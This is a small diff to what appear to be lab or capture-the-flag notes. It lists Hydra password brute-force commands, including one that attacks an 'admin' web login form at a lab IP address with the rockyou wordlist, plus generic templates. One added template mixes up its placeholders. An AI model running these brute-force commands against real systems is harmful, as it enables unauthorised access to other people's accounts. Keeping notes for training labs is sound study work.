@@ -5,3 +5,5 @@ hydra -l admin -P word/rockyou.txt 10.10.135.108 http-post-form "/root/:user=^US
 hydra -l <hostname> -P <wordlist> <ip> <nmapservice>
 
 hydra -l admin -P /path/to/wordlists/rockyou.txt 10.10.135.108 http-post-form "/root/:user=^USER^&pass=^PASS^:Username or password invalid"
+
+hydra -l <operatingsystem> -p <wordlist> <service>://<ipaddr>
